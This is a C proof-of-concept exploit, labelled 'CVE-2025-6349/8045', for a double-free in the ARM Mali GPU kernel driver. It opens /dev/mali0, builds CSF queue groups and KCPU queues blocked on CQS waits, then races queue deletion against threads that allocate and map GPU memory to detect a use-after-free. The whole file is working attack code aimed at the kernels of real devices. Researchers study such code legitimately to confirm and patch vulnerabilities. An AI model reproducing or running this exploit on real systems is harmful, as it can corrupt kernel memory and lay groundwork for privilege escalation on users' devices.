#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <pthread.h>
#include <sys/ioctl.h>
#include <sys/mman.h>

typedef uint64_t u64;
typedef uint32_t u32;
typedef uint16_t u16;
typedef uint8_t  u8;

#define MALI_DEVICE       "/dev/mali0"
#define KBASE_IOCTL_TYPE  0x80

#define BASE_MEM_PROT_CPU_RD  (1u << 0)
#define BASE_MEM_PROT_CPU_WR  (1u << 1)
#define BASE_MEM_PROT_GPU_RD  (1u << 2)
#define BASE_MEM_PROT_GPU_WR  (1u << 3)
#define BASE_MEM_SAME_VA      (1u << 13)
#define BASE_CONTEXT_CSF_EVENT_THREAD ((u32)1 << 2)
#define MEM_ALLOC_FLAGS (BASE_MEM_PROT_CPU_RD | BASE_MEM_PROT_CPU_WR | \
                         BASE_MEM_PROT_GPU_RD | BASE_MEM_PROT_GPU_WR)

struct kbase_ioctl_version_check { u16 major; u16 minor; };
struct kbase_ioctl_set_flags { u32 create_flags; };
union kbase_ioctl_mem_alloc {
    struct { u64 va_pages; u64 commit_pages; u64 extension; u64 flags; } in;
    struct { u64 flags; u64 gpu_va; } out;
};
struct kbase_ioctl_mem_free { u64 gpu_addr; };
struct kbase_ioctl_cs_queue_register { u64 buffer_gpu_addr; u32 buffer_size; u8 priority; u8 padding[3]; };
struct kbase_ioctl_cs_queue_kick { u64 buffer_gpu_addr; };
union kbase_ioctl_cs_queue_bind {
    struct { u64 buffer_gpu_addr; u8 group_handle; u8 csi_index; u8 padding[6]; } in;
    struct { u64 mmap_handle; } out;
};
union kbase_ioctl_cs_queue_group_create {
    struct { u64 tiler_mask; u64 fragment_mask; u64 compute_mask; u8 cs_min; u8 priority; u8 tiler_max; u8 fragment_max; u8 compute_max; u8 csi_handlers; u8 padding[2]; u64 reserved; } in;
    struct { u8 group_handle; u8 padding[3]; u32 group_uid; } out;
};
struct kbase_ioctl_cs_queue_group_term { u8 group_handle; u8 padding[7]; };
typedef u8 base_kcpu_queue_id;
struct kbase_ioctl_kcpu_queue_new { base_kcpu_queue_id id; u8 padding[7]; };
struct kbase_ioctl_kcpu_queue_delete { base_kcpu_queue_id id; u8 padding[7]; };
struct kbase_ioctl_kcpu_queue_enqueue { u64 addr; u32 nr_commands; base_kcpu_queue_id id; u8 padding[3]; };

enum base_kcpu_command_type {
    BASE_KCPU_COMMAND_TYPE_FENCE_SIGNAL=0, BASE_KCPU_COMMAND_TYPE_FENCE_WAIT=1,
    BASE_KCPU_COMMAND_TYPE_CQS_WAIT=2, BASE_KCPU_COMMAND_TYPE_CQS_SET=3,
    BASE_KCPU_COMMAND_TYPE_CQS_WAIT_OPERATION=4, BASE_KCPU_COMMAND_TYPE_CQS_SET_OPERATION=5,
};
struct base_cqs_wait_info { u64 addr; u32 val; u32 padding; };
struct base_kcpu_command_cqs_wait_info { u64 objs; u32 nr_objs; u32 inherit_err_flags; };
struct base_kcpu_command { u8 type; u8 padding[7]; union { struct base_kcpu_command_cqs_wait_info cqs_wait; u64 raw[2]; } info; };

#define KBASE_IOCTL_VERSION_CHECK         _IOWR(KBASE_IOCTL_TYPE, 52, struct kbase_ioctl_version_check)
#define KBASE_IOCTL_SET_FLAGS             _IOW(KBASE_IOCTL_TYPE, 1, struct kbase_ioctl_set_flags)
#define KBASE_IOCTL_MEM_ALLOC             _IOWR(KBASE_IOCTL_TYPE, 5, union kbase_ioctl_mem_alloc)
#define KBASE_IOCTL_MEM_FREE              _IOW(KBASE_IOCTL_TYPE, 7, struct kbase_ioctl_mem_free)
#define KBASE_IOCTL_CS_QUEUE_REGISTER     _IOW(KBASE_IOCTL_TYPE, 36, struct kbase_ioctl_cs_queue_register)
#define KBASE_IOCTL_CS_QUEUE_KICK         _IOW(KBASE_IOCTL_TYPE, 37, struct kbase_ioctl_cs_queue_kick)
#define KBASE_IOCTL_CS_QUEUE_BIND         _IOWR(KBASE_IOCTL_TYPE, 39, union kbase_ioctl_cs_queue_bind)
#define KBASE_IOCTL_CS_QUEUE_GROUP_CREATE _IOWR(KBASE_IOCTL_TYPE, 58, union kbase_ioctl_cs_queue_group_create)
#define KBASE_IOCTL_CS_QUEUE_GROUP_TERMINATE _IOW(KBASE_IOCTL_TYPE, 43, struct kbase_ioctl_cs_queue_group_term)
#define KBASE_IOCTL_KCPU_QUEUE_CREATE     _IOR(KBASE_IOCTL_TYPE, 45, struct kbase_ioctl_kcpu_queue_new)
#define KBASE_IOCTL_KCPU_QUEUE_DELETE     _IOW(KBASE_IOCTL_TYPE, 46, struct kbase_ioctl_kcpu_queue_delete)
#define KBASE_IOCTL_KCPU_QUEUE_ENQUEUE    _IOW(KBASE_IOCTL_TYPE, 47, struct kbase_ioctl_kcpu_queue_enqueue)

static int mali_fd = -1;
static u64 cqs_gpu_va = 0;
static volatile int race_won = 0;

static u64 gpu_alloc(u64 pages, u64 commit, u64 flags) {
    union kbase_ioctl_mem_alloc a = {0};
    a.in.va_pages = pages; a.in.commit_pages = commit; a.in.flags = flags;
    if (ioctl(mali_fd, KBASE_IOCTL_MEM_ALLOC, &a) < 0) return 0;
    return a.out.gpu_va;
}
static void gpu_free(u64 va) { struct kbase_ioctl_mem_free f = {.gpu_addr=va}; ioctl(mali_fd, KBASE_IOCTL_MEM_FREE, &f); }

static void* strike_thread(void* arg) {
    for (int i = 0; i < 60 && !race_won; i++) {
        u64 va = gpu_alloc(1, 1, MEM_ALLOC_FLAGS);
        if (!va) { usleep(5000); continue; }
        void* m = mmap(NULL, 0x1000, PROT_READ|PROT_WRITE, MAP_SHARED, mali_fd, va);
        if (m != MAP_FAILED) {
            volatile u32* v = (volatile u32*)m;
            if (*v != 0) { printf("[!!!] UAF at 0x%llx val=0x%x\n", (unsigned long long)va, *v); race_won=1; }
            munmap(m, 0x1000);
        }
        if (!race_won) gpu_free(va);
        usleep(2000);
    }
    return NULL;
}

int main(int argc, char** argv) {
    int timeout = (argc>1) ? atoi(argv[1]) : 5000;
    printf("CVE-2025-6349/8045 Generic POC\nMali KCPU Dump Double-Free\nTimeout: %dms\n\n", timeout);

    mali_fd = open(MALI_DEVICE, O_RDWR);
    if (mali_fd < 0) { perror("open"); return 1; }
    printf("[+] FD: %d\n", mali_fd);

    struct kbase_ioctl_version_check v = {.major=1,.minor=14};
    ioctl(mali_fd, KBASE_IOCTL_VERSION_CHECK, &v);
    printf("[+] Version: %u.%u\n", v.major, v.minor);

    struct kbase_ioctl_set_flags fl = {.create_flags = BASE_CONTEXT_CSF_EVENT_THREAD};
    ioctl(mali_fd, KBASE_IOCTL_SET_FLAGS, &fl);

    u64 q_va = gpu_alloc(1, 1, MEM_ALLOC_FLAGS);
    if (!q_va) { printf("[-] queue alloc fail\n"); return 1; }
    cqs_gpu_va = gpu_alloc(1, 1, MEM_ALLOC_FLAGS);
    if (!cqs_gpu_va) { printf("[-] cqs alloc fail\n"); return 1; }

    void* cqs_m = mmap(NULL, 0x1000, PROT_READ|PROT_WRITE, MAP_SHARED, mali_fd, cqs_gpu_va);
    if (cqs_m != MAP_FAILED) memset(cqs_m, 0, 0x1000);

    struct kbase_ioctl_cs_queue_register reg = {0};
    reg.buffer_gpu_addr = q_va; reg.buffer_size = 0x1000;
    if (ioctl(mali_fd, KBASE_IOCTL_CS_QUEUE_REGISTER, &reg) < 0) perror("reg");

    union kbase_ioctl_cs_queue_group_create gc = {0};
    if (ioctl(mali_fd, KBASE_IOCTL_CS_QUEUE_GROUP_CREATE, &gc) < 0) perror("gc");
    u8 gh = gc.out.group_handle;

    union kbase_ioctl_cs_queue_bind bind = {0};
    bind.in.buffer_gpu_addr = q_va; bind.in.group_handle = gh; bind.in.csi_index = 0;
    if (ioctl(mali_fd, KBASE_IOCTL_CS_QUEUE_BIND, &bind) < 0) perror("bind");
    u64 cookie = bind.out.mmap_handle;

    void* uio = mmap(NULL, 0x3000, PROT_READ|PROT_WRITE, MAP_SHARED, mali_fd, cookie);
    printf("[+] Context setup: q=0x%llx cqs=0x%llx gh=%u cookie=0x%llx uio=%p\n",
           (unsigned long long)q_va, (unsigned long long)cqs_gpu_va, gh,
           (unsigned long long)cookie, uio);

    u8 kids[8]; int nk=0;
    for (int i=0; i<8; i++) {
        struct kbase_ioctl_kcpu_queue_new kn = {0};
        if (ioctl(mali_fd, KBASE_IOCTL_KCPU_QUEUE_CREATE, &kn) < 0) break;
        kids[i] = kn.id; nk++;

        struct base_cqs_wait_info wi = {.addr=cqs_gpu_va, .val=1};
        struct base_kcpu_command cmd = {0};
        cmd.type = BASE_KCPU_COMMAND_TYPE_CQS_WAIT;
        cmd.info.cqs_wait.objs = (u64)&wi; cmd.info.cqs_wait.nr_objs = 1;
        struct kbase_ioctl_kcpu_queue_enqueue enq = {.addr=(u64)&cmd, .nr_commands=1, .id=kn.id};
        ioctl(mali_fd, KBASE_IOCTL_KCPU_QUEUE_ENQUEUE, &enq);
    }
    printf("[+] %d KCPU queues blocked on CQS_WAIT\n", nk);

    pthread_t th[8];
    for (int i=0; i<8; i++) pthread_create(&th[i], NULL, strike_thread, NULL);

    printf("[*] Waiting %dms for race...\n", timeout);
    usleep(timeout * 1000);

    for (int i=0; i<nk; i++) {
        struct kbase_ioctl_kcpu_queue_delete kd = {.id=kids[i]};
        ioctl(mali_fd, KBASE_IOCTL_KCPU_QUEUE_DELETE, &kd);
    }

    for (int i=0; i<8; i++) pthread_join(th[i], NULL);

    printf("\n%s\n", race_won ? "[!!!] UAF CONFIRMED" : "[*] No corruption detected");
    printf("[*] dmesg: adb shell dmesg | grep -iE 'kasan|use-after-free|double-free|mali'\n");
    printf("[*] UID: %d\n", getuid());

    close(mali_fd);
    return race_won ? 42 : 0;
}
